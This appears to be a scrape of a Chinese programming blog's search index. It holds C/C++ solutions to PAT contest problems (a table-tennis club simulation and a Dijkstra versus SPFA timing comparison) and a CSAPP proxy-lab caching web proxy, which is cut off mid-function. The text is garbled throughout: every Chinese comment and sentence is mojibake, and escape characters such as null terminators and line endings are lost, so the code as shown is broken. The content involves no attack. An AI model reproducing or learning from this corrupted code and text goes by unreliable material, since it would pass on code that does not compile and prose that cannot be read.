int n, tableNum, viptableNum, minemptytable;	//è®°å½•æ•°ã€æ¡Œå­æ€»æ•°ï¼Œvipæ¡Œå­æ€»æ•°ï¼Œç´¢å¼•å·æœ€å°çš„ç©ºæ¡Œå­çš„ç´¢å¼•
int timeStamp;	//æ—¶é—´æˆ³,8:00:00ä¸º0,21:00:00ä¸º46800
int serverIndex, arriveIndex;	//å½“å‰æœªæœåŠ¡ç©å®¶çš„ç´¢å¼•ã€å½“å‰å¯æœåŠ¡ç©å®¶ç´¢å¼•  [serverIndex,arriveIndex)ä¸ºå½“å‰æ—¶é—´
								//å¯æœåŠ¡ä½†å°šæœªæœåŠ¡çš„ç©å®¶
queue&amp;lt;int&amp;gt; VIPwaitIndex;		//åœ¨ç­‰å¾…ä¸­çš„vipç©å®¶
People playpairs[MAXPEOPLE];	//ç©å®¶è®°å½•
int tables[MAXTABLE] = { 0 };	//å½“å‰æ¡Œå­è¿˜è¦ç”¨å¤šä¹…ï¼Œ0ä»£è¡¨ç©ºæ¡Œå­

bool isVIP[MAXTABLE] = { false };	//è®°å½•æ¡Œå­æ˜¯ä¸æ˜¯VIPæ¡Œ
int serverNum[MAXTABLE] = { 0 };	//æ¯ä¸ªæ¡Œå­æœåŠ¡è¿‡çš„äººæ•°
vector&amp;lt;int&amp;gt; VIPtable;		//è®°å½•vipæ¡Œå­çš„ç´¢å¼•

void dealServerIndex();
void handelTableUse()
{
	//åœ¨æ¯ä¸€ä¸ªæ—¶é’Ÿæ»´ç­”åˆ°æ¥æ—¶ï¼Œå°†æ­£åœ¨ä½¿ç”¨çš„æ¡Œå­çš„ä½¿ç”¨æ—¶é—´å‡å°‘1ï¼Œå¦‚æœå‡å°‘åä¸º0ï¼Œåˆ™è¯¥æ¡Œå­ä¸ºç©ºï¼Œè€ƒè™‘æ›´æ–°minemptytable
	int i;
	for (i = 0; i &amp;lt; tableNum; i++) {
		if (tables[i] &amp;gt; 0)
			tables[i]--;
		if (tables[i] == 0)
			if (i &amp;lt; minemptytable)	//è€ƒè™‘æ›´æ–°minemptytable
				minemptytable = i;
	}
}

void serverPeople(int peopleIndex, int tableIndex)
{
	//æœåŠ¡playpairsä¸­ç´¢å¼•å·ä¸ºpeopleIndexçš„ç©å®¶ï¼Œä½¿ç”¨çš„æ¡Œå­ä¸ºtableIndex
	playpairs[peopleIndex].servered = true;	//æ ‡è®°å·²æœåŠ¡
	playpairs[peopleIndex].serverTime = timeStamp;	//è®°å½•æœåŠ¡æ—¶é—´
	tables[tableIndex] = playpairs[peopleIndex].needTime;	//å¼€å§‹æ¡Œå­æ—¶é—´çš„å€’è®¡æ—¶
	serverNum[tableIndex]++;	//è®°å½•è¯¥æ¡Œå­çš„æœåŠ¡äººæ•°
	while (minemptytable &amp;lt; tableNum &amp;amp;&amp;amp; tables[minemptytable]&amp;gt;0) {
		//æ›´æ–°minemptytableï¼Œè¿™é‡Œä¸€å®šè¦ç”¨whileï¼Œå› ä¸ºç©ºæ¡Œå­ä¸æ˜¯è¿ç»­çš„
		minemptytable++;
	}
	dealServerIndex();
}

void dealServerIndex()
{
	//æ›´æ–°å¾…æœåŠ¡ç©å®¶ç´¢å¼•serverIndexï¼Œè¿™é‡Œä¸€å®šè¦ç”¨whileï¼Œå› ä¸ºå¯èƒ½å­˜åœ¨æœ‰çš„ç©å®¶å› ä¸ºVIPæ’é˜Ÿçš„åŸå› å·²ç»è¢«æœåŠ¡äº†
	while (playpairs[serverIndex].servered) {
		serverIndex++;
	}
}

void dealVIPtable()
{
	//å¤„ç†ç©ºçš„VIPä¸“å±æ¡Œå­
	for (int t : VIPtable) {
		if (tables[t] == 0 &amp;amp;&amp;amp; !VIPwaitIndex.empty()) {
			//æ¡Œå­ä¸ºç©ºä¸”æœ‰VIPç©å®¶åœ¨ç­‰å¾…ï¼Œåˆ™æœåŠ¡è¿™ä¸ªç©å®¶
			int p = VIPwaitIndex.front();
			VIPwaitIndex.pop();
			serverPeople(p, t);
		}
	}
}

void handelEmptyTable()
{
	//åœ¨æ¯ä¸€ä¸ªæ—¶é’Ÿæ»´ç­”ï¼ŒæŠŠæ¡Œå­çš„ä½¿ç”¨å€’è®¡æ—¶-1åï¼Œå¤„ç†æ‰€æœ‰çš„ç©ºæ¡Œå­
	dealVIPtable();	//é¦–å…ˆå¤„ç†VIPæ¡Œå­ï¼Œå› ä¸ºå¦‚æœç­‰å¾…é˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€äººæ˜¯VIPï¼Œ
					//ä¸”åŒæ—¶å­˜åœ¨VIPæ¡Œå­å’Œæ™®é€šæ¡Œå­æ—¶ï¼Œä¼˜å…ˆé€‰æ‹©VIPæ¡Œå­

	//æŒ‰åºå¤„ç†æ‰€æœ‰ç©ºæ¡Œå­
	while (minemptytable &amp;lt; tableNum &amp;amp;&amp;amp; serverIndex &amp;lt; arriveIndex) {
		if (playpairs[serverIndex].VIP) {
			//å¦‚æœæ’åœ¨ç¬¬ä¸€çš„æ˜¯ä¸€ä¸ªVIPç©å®¶ï¼Œåˆ™ä»–ä¸€å®šæ²¡æœ‰VIPæ¡Œå­å¯ç”¨äº†ï¼Œæ‰€ä»¥ä»–ç”¨äº†ä¸€ä¸ªæ™®é€šæ¡Œå­ï¼Œ
			//å› æ­¤ä¸ä¼šåœ¨dealVIPtable()ä¸­å‡ºå¯¹ï¼Œæ•…è¦ç§»å‡ºVIPç­‰å¾…é˜Ÿåˆ—
			VIPwaitIndex.pop();
		}
		serverPeople(serverIndex, minemptytable);
	}
}

void handelPeopleArrive()
{
	//åœ¨æ¯ä¸€ä¸ªæ—¶é’Ÿæ»´ç­”ï¼Œå¦‚æœåˆ°äº†ä¸‹ä¸€ä¸ªç©å®¶åˆ°æ¥çš„æ—¶é—´ï¼Œå°±å°†arriveIndex++ï¼Œä»£è¡¨åˆ°è¾¾äº†
	//ä¸€ä¸ªæ–°çš„ç©å®¶ï¼Œå¹¶è€ƒè™‘ä»–æ˜¯ä¸æ˜¯VIPï¼Œæ˜¯åˆ™åŠ å…¥VIPç­‰å¾…é˜Ÿåˆ—
	if (playpairs[arriveIndex].arrTime == timeStamp) {
		if (playpairs[arriveIndex].VIP) {
			VIPwaitIndex.push(arriveIndex);
		}
		arriveIndex++;
	}
}

int main() {
	int h, m, s, i, need, tag;
	scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
	for (i = 0; i &amp;lt; n; i++) {
		//ç©å®¶ä¿¡æ¯è¾“å…¥
		scanf(&amp;quot;%d:%d:%d %d %d&amp;quot;, &amp;amp;h, &amp;amp;m, &amp;amp;s, &amp;amp;need, &amp;amp;tag);
		if (need &amp;gt; 120) {
			need = 120;
		}
		playpairs[i].arrTime = TIME2SECOND(h, m, s);
		playpairs[i].needTime = MINUTE2SECOND(need);
		if (tag == 1)
			playpairs[i].VIP = true;
	}
	scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;tableNum,&amp;amp;viptableNum);
	for (i = 0; i &amp;lt; viptableNum; i++) {
		//æ¡Œå­ä¿¡æ¯è¾“å…¥
		int v;
		scanf(&amp;quot;%d&amp;quot;, &amp;amp;v);
		VIPtable.push_back(--v);	//å°†æ¡Œå­ç´¢å¼•è½¬ä¸º0å¼€å§‹
		isVIP[v] = true;
	}

	//æŒ‰ç…§ç©å®¶åˆ°è¾¾æ—¶é—´å‡åºæ’åˆ—
	sort(playpairs, playpairs + n, [](People&amp;amp; a, People&amp;amp; b) {return a.arrTime &amp;lt; b.arrTime; });

	serverIndex = 0;
	minemptytable = 0;
	arriveIndex = 0;
	for (timeStamp = 0; timeStamp &amp;lt; MAXTIMESTAMP; timeStamp++) {
		//æ¯ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œé¦–å…ˆå¤„ç†ç©å®¶åˆ°è¾¾äº‹ä»¶ï¼Œå†å¤„ç†æ¡Œå­ä½¿ç”¨è®¡æ—¶å‡1äº‹ä»¶ï¼Œæœ€åå¤„ç†
		//ç©ºæ¡Œå­ä½¿ç”¨äº‹ä»¶ï¼Œä¸‰è€…çš„é¡ºåºä¸èƒ½é¢ å€’
		handelPeopleArrive();
		handelTableUse();
		handelEmptyTable();
		if (serverIndex == arriveIndex == n)	
			//æ‰€æœ‰ç©å®¶éƒ½å·²ç»æœåŠ¡äº†
			break;
	}

	for (i = serverIndex; i &amp;lt; arriveIndex; i++) {
		//åœ¨[serverIndex,arriveIndex)ä¸­ï¼Œå¯èƒ½å­˜åœ¨å› ä¸ºVIPæ’é˜Ÿè€Œå·²è¢«æœåŠ¡çš„ç©å®¶ï¼Œæ•…è¦
		//æŠŠè¯¥ç©å®¶æå‰ï¼Œè¿™æ ·æœ€ååœ¨[0,serverIndex)ä¸­çš„å°±æ˜¯å…¨éƒ¨æœåŠ¡è¿‡çš„ç©å®¶
		if (playpairs[i].servered) {
			playpairs[serverIndex++] = playpairs[i];
		}
	}

	//æ ¹æ®æœåŠ¡æ—¶é—´å‡åºæ’åˆ—
	sort(playpairs, playpairs + serverIndex, [](People&amp;amp; a, People&amp;amp; b) {return a.serverTime &amp;lt; b.serverTime; });
	
	//ç­”æ¡ˆè¾“å‡º
	for (i = 0; i &amp;lt; serverIndex; i++) {
		printTime(playpairs[i].arrTime);
		printTime(playpairs[i].serverTime);
		printf(&amp;quot;%d\n&amp;quot;, second2minute(playpairs[i].serverTime - playpairs[i].arrTime));
	}
	printf(&amp;quot;%d&amp;quot;, serverNum[0]);
	for (i = 1; i &amp;lt; tableNum; i++) {
		printf(&amp;quot; %d&amp;quot;, serverNum[i]);
	}

	return 0;
}


/*
//input
2
08:00:00 10 1
08:05:00 10 1
3 2
2 3

//output
08:00:00 08:00:00 0
08:05:00 08:05:00 0
0 1 1
*/


/*
//input
2
20:00:00 60 0
20:30:00 10 1
1 1
1

//output
20:00:00 20:00:00 0
1
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€ä¸‹é¢æ˜¯ç®—æ³•ç¬”è®°ä¸Šç»™å‡ºçš„å‡ ç»„æµ‹è¯•æ•°æ®ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/_fd5b180732b660f13e5fc326933e6bb1.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™ç§æ–¹æ³•è™½ç„¶å¤–å±‚å¾ªç¯æœ‰46800æ¬¡ï¼Œä½†æ˜¯å†…å±‚å¤§éƒ¨åˆ†æ—¶é—´åªæ˜¯ä¸€ä¸ªç®€å•çš„åˆ¤æ–­ï¼Œæ²¡æœ‰å®é™…æ“ä½œï¼Œæ‰€ä»¥è€—æ—¶å¹¶ä¸é«˜ã€‚&lt;/p&gt;
">PAT1026 Table Tennis (30åˆ†)æ—¶é—´æˆ³æ³•</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/sw67dr_hpnu4t/"" data-c="
          &lt;p&gt;æœ€è¿‘çœ‹äº†ã€Šç®—æ³•ç¬”è®°ã€‹ä¸Šé¢å…³äºæœ€çŸ­è·¯å¾„çš„éƒ¨åˆ†ï¼Œå­¦ä¹ äº†ä¸€ç§ä¹‹å‰æ²¡è§è¿‡çš„ç®—æ³•ï¼š&lt;strong&gt;SPFAã€‚&lt;/strong&gt;&lt;br&gt;
ç†è®ºä¸ŠSPFAç®—æ³•ä¼šæ¯”Dijkstraå¿«ï¼Œé¡¾è€Œæ‰¾äº†ä¸€é¢˜æµ‹è¯•ä¸€ä¸‹ã€‚&lt;br&gt;
ä½¿ç”¨PATÂ A1072é¢˜ï¼Œå› ä¸ºè¿™é¢˜æ±‚&lt;strong&gt;æœ€çŸ­è·¯å¾„çš„éƒ¨åˆ†å¾ˆå•çº¯ï¼Œæ²¡æœ‰å…¶ä»–çš„æƒï¼Œè€Œä¸”æµ‹è¯•ç‚¹çš„å¤æ‚åº¦å¤Ÿé«˜ï¼Œèƒ½å¤Ÿçœ‹å‡ºæ—¶é—´ä¸Šçš„å·®åˆ«ã€‚&lt;/strong&gt;&lt;br&gt;
&lt;a href=&#34;https://pintia.cn/problem-sets/994805342720868352/problems/994805396953219072&#34;&gt;é¢˜ç›®é“¾æ¥&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;é€Ÿåº¦å¯¹æ¯”é‡ç‚¹çœ‹æµ‹è¯•ç‚¹4&#34;&gt;é€Ÿåº¦å¯¹æ¯”ï¼ˆé‡ç‚¹çœ‹æµ‹è¯•ç‚¹4ï¼‰&lt;/h2&gt;
&lt;h3 id=&#34;dijkstraé€Ÿåº¦&#34;&gt;Dijkstraé€Ÿåº¦&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_3dfbda0886ef9d9aefa1315db1cb7f78.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;spfa&#34;&gt;SPFA&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_78d365c8596c6ebefa6224fa455883c0.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¤šæ¬¡æäº¤å¯¹æ¯”ï¼ŒDijkstraç®—æ³•éƒ½åœ¨50mså·¦å³ï¼Œè€ŒSPFAä¸€ç›´åœ¨10mså·¦å³ï¼Œå¯è§SPFAç¡®å®æ¯”Dijkstraå¿«ä¸å°‘ï¼Œè€Œä¸”æ€è·¯ä¹Ÿä¸å¤æ‚ï¼Œä»¥åå¯ä»¥å¤šå¤šä½¿ç”¨ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä»£ç å¦‚ä¸‹&#34;&gt;ä»£ç å¦‚ä¸‹&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
#include&amp;lt;unordered_map&amp;gt;
using namespace std;
#define MAXNODE 1015
#define INF 0x3ffffff
#define G2index(G) ((n)+(G))
#define index2G(index) ((index)-(G))

struct Node
{
	int v, dis;//ç›®æ ‡ä¸è·ç¦»
};

int dis[MAXNODE];
int n, m, k, dmax;
bool used[MAXNODE], inqueue[MAXNODE];
vector&amp;lt;Node&amp;gt; graph[MAXNODE];

void Dijkstra(int start)
{
	fill(dis, dis + MAXNODE, INF);
	fill(used, used + MAXNODE, false);
	dis[start] = 0;

	for (int i = 0; i &amp;lt; n + m - 1; i++) {
		int minnode = -1, mindis = INF;
		for (int j = 1; j &amp;lt;= n + m; j++) {
			if (!used[j] &amp;amp;&amp;amp; dis[j] &amp;lt; mindis) {
				minnode = j;
				mindis = dis[j];
			}
		}
		if (minnode == -1)
			return;

		used[minnode] = true;
		int tdis = dis[minnode];
		for (Node node : graph[minnode]) {
			if (tdis + node.dis &amp;lt; dis[node.v]) {
				dis[node.v] = tdis + node.dis;
			}
		}
	}
}

void SPFA(int start)
{
	fill(dis, dis + MAXNODE, INF);
	fill(inqueue, inqueue + MAXNODE, false);
	dis[start] = 0;

	int tdis = 0;
	queue&amp;lt;int&amp;gt; q;
	for (Node node : graph[start]) {
		if (tdis + node.dis &amp;lt; dis[node.v]) {
			dis[node.v] = node.dis + tdis;
			q.push(node.v);
			inqueue[node.v] = true;
		}
	}
	while (!q.empty()) {
		int nodeid = q.front();
		q.pop();
		inqueue[nodeid] = false;
		for (Node node : graph[nodeid]) {
			tdis = dis[nodeid];
			if (tdis + node.dis &amp;lt; dis[node.v]) {
				dis[node.v] = node.dis + tdis;
				if (!inqueue[node.v]) {
					q.push(node.v);
					inqueue[node.v] = true;
				}
			}
		}
	}
}

struct Ans
{
	int Gid, mindis, totaldis;
};
vector&amp;lt;Ans&amp;gt; ans;

void getans(int Gid)
{
	int totaldis, mindis;
	mindis = INF;
	totaldis = 0;
	for (int i = 1; i &amp;lt;= n; i++) {
		if (dis[i] &amp;gt; dmax)
			return;
		if (dis[i] &amp;lt; mindis) {
			mindis = dis[i];
		}
		totaldis += dis[i];
	}
	ans.push_back(Ans{ Gid,mindis,totaldis });
}

int main() {
	scanf(&amp;quot;%d%d%d%d&amp;quot;, &amp;amp;n, &amp;amp;m, &amp;amp;k, &amp;amp;dmax);
	for (int i = 0; i &amp;lt; k; i++) {
		int c1, c2, dd;
		char cs1[10], cs2[10];
		scanf(&amp;quot;%s%s%d&amp;quot;, cs1, cs2, &amp;amp;dd);
		if (cs1[0] == &#39;G&#39;) {
			c1 = G2index(atoi(cs1 + 1));
		}
		else {
			c1 = atoi(cs1);
		}

		if (cs2[0] == &#39;G&#39;) {
			c2 = G2index(atoi(cs2 + 1));
		}
		else {
			c2 = atoi(cs2);
		}
		graph[c1].push_back(Node{ c2, dd });
		graph[c2].push_back(Node{ c1, dd });
	}
	for (int i = 1; i &amp;lt;= m; i++) {
		//Dijkstra(G2index(i));
		SPFA(G2index(i));
		getans(i);
	}

	Ans myans;
	myans.Gid = -1;
	myans.totaldis = INF;
	myans.mindis = 0;
	for (Ans a : ans) {
		if (a.mindis &amp;gt; myans.mindis)
			myans = a;
		else if (a.mindis == myans.mindis) {
			if (a.totaldis &amp;lt; myans.totaldis)
				myans = a;
		}
	}
	if (myans.Gid == -1) {
		printf(&amp;quot;No Solution&amp;quot;);
		return 0;
	}
	printf(&amp;quot;G%d\n%.1lf %.1lf&amp;quot;, myans.Gid, (double)myans.mindis, (double)myans.totaldis / n);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»£ç æ€è·¯å°±ä¸å†™äº†ï¼Œå¤§å®¶å¯ä»¥çœ‹ç®—æ³•ç¬”è®°ã€‚&lt;/p&gt;
">Dijkstraç®—æ³•ä¸SPFAç®—æ³•</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/uscxh7_cwdngk/"" data-c="
          &lt;p&gt;è¿™æ˜¯æœ¬ä¹¦çš„æœ€åä¸€ä¸ªlabäº†ï¼Œä½†æ€»ä½“ä¸Šæ²¡æœ‰å‰é¢çš„malloclabå’Œshelllabéš¾ï¼Œå¥½å¥½çœ‹ä¹¦ï¼Œå¤šå¤šå‚è€ƒtinywebçš„ä»£ç ï¼Œè¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“å†™å‡ºæ¥çš„ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä»£ç &#34;&gt;ä»£ç &lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;quot;csapp.h&amp;quot;

/* Recommended max cache and object sizes */
#define MAX_CACHE_SIZE 1049000
#define MAX_OBJECT_SIZE 102400
#define MMAXLINE 2048
#define MAXHEADER 4096
#define MAXCACHEBLOCK 50

struct cache_block
{
    char header[MAXHEADER];
    char path[MMAXLINE];
    char *body;
    int body_size;
    char visit;
};

struct _cache
{
    struct cache_block *block_slot[MAXCACHEBLOCK];
    int clock_p;
    int used_size;
    int used_block;
} cache;

int read_cnt;
sem_t mutex, write_lock;

/* You won&#39;t lose style points for including this long line in your code */
static const char *user_agent_hdr = &amp;quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3&amp;quot;;

void doit(int connfd);
void request_back_server(rio_t *rio_buf, char *host, char *port, char *path, char *real_path);
void http_error(int fd, char *errnum, char *msg);
int parse_request(char *request, char *host, char *port, char *path);
void deal_request_header(char *header_line, int back_server_fd);
void get_back_response_and_send_to_client(int fd_conn_back_server, int client_fd, char *path);
void html_error(int fd, char *msg);
void *thread(void *vargp);
void init_cache();
int read_cache(char *header, char *body, char *real_path);
int write_cache(char *header, char *body, int body_size, char *real_path);
int next_slot(int need_size);
void evict();

int main(int argc, char **argv)
{
    //printf(&amp;quot;%s
&amp;quot;, user_agent_hdr);
    int listenfd, connfd;
    pthread_t tid;
    int *vargs = NULL;
    socklen_t clientlen;
    struct sockaddr_storage clientaddr;
    /* Check command line args */
    if (argc != 2)
    {
        fprintf(stderr, &amp;quot;usage: %s &amp;lt;port&amp;gt;
&amp;quot;, argv[0]);
        exit(1);
    }

    init_cache();
    listenfd = Open_listenfd(argv[1]);
    while (1)
    {
        clientlen = sizeof(clientaddr);
        connfd = Accept(listenfd, (SA *)&amp;amp;clientaddr, &amp;amp;clientlen);
        //doit(connfd);

        if ((vargs = (int *)malloc(sizeof(int))) == NULL)
        {
            http_error(connfd, &amp;quot;500&amp;quot;, &amp;quot;not enough memory!&amp;quot;);
            Close(connfd);
        }
        else
        {
            *vargs = connfd;
            pthread_create(&amp;amp;tid, NULL, thread, (void *)vargs);
        }
    }
}

void *thread(void *vargp)
{
    int connfd = *((int *)vargp);
    pthread_detach(pthread_self());
    free(vargp);
    doit(connfd);
    Close(connfd);
    return NULL;
}

void doit(int connfd)
{
    rio_t Riobuf;
    char req_buf[MMAXLINE], host[MMAXLINE], port[MMAXLINE], path[MMAXLINE], real_path[MAXLINE];
    char *header, *body;
    int body_size;
    rio_readinitb(&amp;amp;Riobuf, connfd);
    if (!rio_readlineb(&amp;amp;Riobuf, req_buf, MMAXLINE))
        return;

    if (parse_request(req_buf, host, port, path) &amp;lt; 0)
        http_error(connfd, &amp;quot;403&amp;quot;, &amp;quot;Unknown request&amp;quot;);
    else
    {
        sprintf(real_path, &amp;quot;%s:%s%s&amp;quot;, host, port, path);
        header = (char *)malloc(MAXHEADER);
        body = (char *)malloc(MAX_OBJECT_SIZE);
        if (header != NULL &amp;amp;&amp;amp; body != NULL)
        {
            if ((body_size = read_cache(header, body, real_path)) &amp;gt;= 0)
            {
                Rio_writen(connfd, header, strlen(header));
                Rio_writen(connfd, &amp;quot;
&amp;quot;, strlen(&amp;quot;
&amp;quot;));
                Rio_writen(connfd, body, body_size);
                free(header);
                free(body);
                return;
            }
        }
        free(header);
        free(body);
        request_back_server(&amp;amp;Riobuf, host, port, path, real_path);
    }
}

/*æ ¹æ®ç¬¬ä¸€è¡Œçš„è¯·æ±‚è§£æå‡ºhostï¼Œportä¸è¯·æ±‚pathï¼Œæ­£ç¡®è¿”å›0ï¼Œå‡ºé”™è¿”å›-1*/
int parse_request(char *request, char *host, char *port, char *path)
{
    char method[MMAXLINE], path_buf[MMAXLINE], version[MMAXLINE], host_buf[MMAXLINE], port_buf[MMAXLINE];
    char *i, *host_buf_p, *port_buf_p;
    int have_port = 1;
    memset(path_buf, 0, MMAXLINE);
    sscanf(request, &amp;quot;%s %s %s&amp;quot;, method, path_buf, version);
    if (strcmp(method, &amp;quot;GET&amp;quot;))
        return -1;
    i = path_buf;
    host_buf_p = host_buf;
    port_buf_p = port_buf;
    while (*i != &#39;/&#39; &amp;amp;&amp;amp; *i != &#39;&#39;)
        i++;
    if (*i != &#39;&#39;)
        i++;
    if (*i != &#39;&#39;)
        i++;
    while (*i != &#39;:&#39; &amp;amp;&amp;amp; *i != &#39;&#39;)
    {
        if (*i == &#39;/&#39;)
        {
            have_port = 0;
            break;
        }
        *host_buf_p++ = *i++;
    }
    *host_buf_p = &#39;&#39;;
    if (!have_port)
    {
        sprintf(port_buf_p, &amp;quot;80&amp;quot;);
    }
    else
    {
        i++;
        while (*i != &#39;/&#39; &amp;amp;&amp;amp; *i != &#39;&#39;)
        {
            *port_buf_p++ = *i++;
        }
        *port_buf_p = &#39;&#39;;
    }

    if (*i == &#39;&#39;)
        return -1;

    sprintf(host, &amp;quot;%s&amp;quot;, host_buf);
    sprintf(port, &amp;quot;%s&amp;quot;, port_buf);
    sprintf(path, &amp;quot;%s&amp;quot;, i);
    //sprintf(request, &amp;quot;%s %s %s
&amp;quot;, method, i, &amp;quot;HTTP/1.0&amp;quot;);
    return 0;
}

/*è§£æå‰©ä¸‹çš„å¤´éƒ¨ï¼Œæ„é€ å¹¶å‘é€å‘åå°æœåŠ¡å™¨çš„è¯·æ±‚,æœ€åæ¥å—è¯·æ±‚å¹¶è¿”å›ç»™å®¢æˆ·ç«¯*/
void request_back_server(rio_t *rio_buf, char *host, char *port, char *path, char *real_path)
{
    int fd_conn_back_server, fd_conn_client;
    char buf[MMAXLINE];

    fd_conn_client = rio_buf-&amp;gt;rio_fd;
    fd_conn_back_server = Open_clientfd(host, port);

    sprintf(buf, &amp;quot;GET %s HTTP/1.0
&amp;quot;, path);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));
    sprintf(buf, &amp;quot;Host: %s:%s
&amp;quot;, host, port);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));
    sprintf(buf, &amp;quot;User-Agent: %s
&amp;quot;, user_agent_hdr);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));
    sprintf(buf, &amp;quot;Connection: close
&amp;quot;);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));
    sprintf(buf, &amp;quot;Proxy-Connection: close
&amp;quot;);
    Rio_writen(fd_conn_back_server, buf, strlen(buf));

    while (1)
    {
        Rio_readlineb(rio_buf, buf, MMAXLINE);
        if (!strcmp(buf, &amp;quot;
&amp;quot;))
        {
            Rio_writen(fd_conn_back_server, buf, strlen(buf));
            break;
        }
        deal_request_header(buf, fd_conn_back_server);
    }

    get_back_response_and_send_to_client(fd_conn_back_server, fd_conn_client, real_path);
    //Close(connfd);
    return;
}

/*å¤„ç†è¯·æ±‚å¤´,å¿½ç•¥ç»™å®šçš„å¤´ï¼ˆéœ€è¦ä¿®æ”¹çš„å¤´ï¼‰,å¹¶æŠŠå…¶ä½™å¤´å‘é€ç»™åå°æœåŠ¡å™¨*/
void deal_request_header(char *header_line, int back_server_fd)
{
    char key[MMAXLINE], value[MMAXLINE];
    sscanf(header_line, &amp;quot;%s %s&amp;quot;, key, value);
    if (!strcmp(key, &amp;quot;Host:&amp;quot;))
        return;
    else if (!strcmp(key, &amp;quot;User-Agent:&amp;quot;))
    {
        return;
    }
    else if (!strcmp(key, &amp;quot;Connection:&amp;quot;))
    {
        return;
    }
    else if (!strcmp(key, &amp;quot;Proxy-Connection:&amp;quot;))
    {
        return;
    }
    else
    {
        Rio_writen(back_server_fd, header_line, strlen(header_line));
        return;
    }
}

/*è¯»åå°çš„è¿”å›ï¼Œå¹¶ä¸”å†™ç»™å®¢æˆ·ç«¯*/
void get_back_response_and_send_to_client(int fd_conn_back_server, int client_fd, char *real_path)
{
    int body_length, body_length_record;
    ssize_t read_size;
    rio_t rio_buf;
    char buf[MMAXLINE], key[MMAXLINE], value[MMAXLINE];
    char *body_data, *temp_body_data_ptr, *temp_buf_ptr, *header_data;
    Rio_readinitb(&amp;amp;rio_buf, fd_conn_back_server);

    if ((header_data = (char *)malloc(MAXHEADER)) == NULL)
    {
        http_error(client_fd, &amp;quot;500&amp;quot;, &amp;quot;not enough memory&amp;quot;);
        return;
    }

    Rio_readlineb(&amp;amp;rio_buf, buf, MMAXLINE); //è¿”å›ç 
    Rio_writen(client_fd, buf, strlen(buf));
    sprintf(header_data, &amp;quot;%s&amp;quot;, buf);

    while (1)
    { /*è¯»å¤´éƒ¨*/
        Rio_readlineb(&amp;amp;rio_buf, buf, MMAXLINE);
        if (!strcmp(buf, &amp;quot;
&amp;quot;))
        {
            Rio_writen(client_fd, buf, strlen(buf));
            break;
        }
        //deal_request_header(buf, fd_conn_back_server);
        sscanf(buf, &amp;quot;%s %s&amp;quot;, key, value);
        if (!strcmp(key, &amp;quot;Content-length:&amp;quot;))
        {
            body_length = atoi(value);
        }
        Rio_writen(client_fd, buf, strlen(buf));
        strcat(header_data, buf);
    }

    if (body_length &amp;gt; MAX_OBJECT_SIZE) //ä¸èƒ½ç¼“å­˜
    {
        while (body_length &amp;gt; 0)
        {
            read_size = Rio_readnb(&amp;amp;rio_buf, buf, MMAXLINE);
            body_length -= read_size;
            Rio_writen(client_fd, buf, read_size);
        }
        free(header_data);
    }
    else //å¯ä»¥ç¼“å­˜
    {
        if ((body_data = (char *)malloc(body_length)) == NULL)
        {
            html_error(client_fd, &amp;quot;not enough memory&amp;quot;);
            //Close(client_fd);
            Close(fd_conn_back_server);
            return;
        }
        body_length_record = body_length;
        temp_body_data_ptr = body_data;
        while (body_length &amp;gt; 0)
        {
            read_size = Rio_readnb(&amp;amp;rio_buf, buf, MMAXLINE);
            body_length -= read_size;

            Rio_writen(client_fd, buf, read_size);

            temp_buf_ptr = buf; //å†™å±€éƒ¨ç¼“å­˜
            while (read_size &amp;gt; 0)
            {
                *temp_body_data_ptr++ = *temp_buf_ptr++;
                read_size--;
            }
        }
        write_cache(header_data, body_data, body_length_record, real_path);
        free(header_data);
        free(body_data);
    }

    Close(fd_conn_back_server);
    //Rio_writen(client_fd, )
}
/*å¦‚å‡½æ•°å*/
void http_error(int fd, char *errnum, char *msg)
{
    char buf[MMAXLINE];

    /* Print the HTTP response headers */
    sprintf(buf, &amp;quot;HTTP/1.0 %s %s
&amp;quot;, errnum, msg);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;Content-type: text/html

&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));

    /* Print the HTTP response body */
    sprintf(buf, &amp;quot;&amp;lt;html&amp;gt;&amp;lt;title&amp;gt;Request Error&amp;lt;/title&amp;gt;&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;&amp;lt;body bgcolor=&amp;quot;
                 &amp;quot;ffffff&amp;quot;
                 &amp;quot;&amp;gt;
&amp;quot;);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;%s: %s
&amp;quot;, errnum, msg);
    Rio_writen(fd, buf, strlen(buf));
    sprintf(buf, &amp;quot;&amp;lt;hr&amp;gt;&amp;lt;em&amp;gt;The Tiny Proxy server&amp;lt;/em&amp;gt;
